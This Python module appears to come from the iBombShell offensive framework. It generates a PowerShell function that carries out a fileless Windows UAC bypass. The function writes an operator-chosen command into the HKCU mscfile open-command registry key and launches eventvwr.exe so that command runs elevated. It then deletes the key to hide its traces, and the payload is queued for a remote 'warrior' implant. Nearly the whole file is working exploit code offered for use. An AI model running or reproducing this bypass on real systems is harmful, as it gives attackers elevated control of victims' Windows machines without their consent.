from termcolor import colored, cprint
from warrior_check import exist_warrior
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Bypass UAC - Fileless: invoke-eventvwr",
                       "Description": "Bypass UAC Fileless. Binary: eventvwr.exe on several Windows",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "instruction": [None, "Instruction bypass UAC", False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if exist_warrior(self.args["warrior"]):
            function = """function invoke-eventvwr{
  param(
    [String] $instruction,
    [Switch] $noDefault
  )
  
  $path = 'hkcu:\software\classes\mscfile\shell\open\command'

  #check if exist hkcu:\software\classes\mscfile\shell\open\command
  if(-not(Test-Path -Path $path))
  {
    printMessage -message "Path doesn't exist"
    printMessage -message "Creating path"
    mkdir -Force hkcu:\software\classes\mscfile\shell\open\command
  }

  if($noDefault)
  {
    New-ItemProperty -Name '(Default)' -Value $instruction -Path $path
  }
  else
  {
    New-ItemProperty -Name '(Default)' -Value "c:\windows\system32\windowspowershell\\v1.0\powershell.exe -C echo pwned > c:\iBombShell.txt" -Path $path
  }

  Start-Process C:\windows\System32\eventvwr.exe 
  sleep 1 
  rm -Force -Recurse 'hkcu:\software\classes\mscfile'
  
}

"""

            if self.args["instruction"]:
                function += 'invoke-eventvwr -instruction "{}" -noDefault'.format(self.args["instruction"])
            else:
                function += 'invoke-eventvwr'

            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')

        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')
